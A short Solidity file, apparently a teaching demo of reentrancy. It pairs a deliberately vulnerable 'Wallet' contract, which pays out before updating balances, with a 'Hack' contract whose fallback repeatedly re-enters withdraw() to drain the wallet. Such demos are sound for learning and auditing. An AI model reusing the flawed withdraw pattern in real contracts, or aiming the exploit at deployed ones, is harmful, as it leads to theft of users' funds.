//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.12;

contract Hack {
    Wallet public wallet;
    constructor(address _wallet) public{
        wallet = Wallet(payable(_wallet));
    }
    function attack() external payable {
        require(msg.value>=1 ether, "send more money");
        wallet.deposit{value: 1 ether}();
        wallet.withdraw(1 ether);
    }

    receive() payable external {
        if (address(wallet).balance>=1 ether) {
             wallet.withdraw(1 ether);
        }
    }
}

contract Wallet {
    mapping(address => uint) public balances;
    function deposit() public payable {
        balances[msg.sender]+=msg.value;
    }
    function withdraw(uint amount) public payable{
        require(balances[msg.sender]>=amount, "not enough money");
        (bool sent,) = payable(msg.sender).call{value: amount}("");
        require(sent, "call failed");
        balances[msg.sender]-= amount;
        
    }
    receive() payable external {}
}
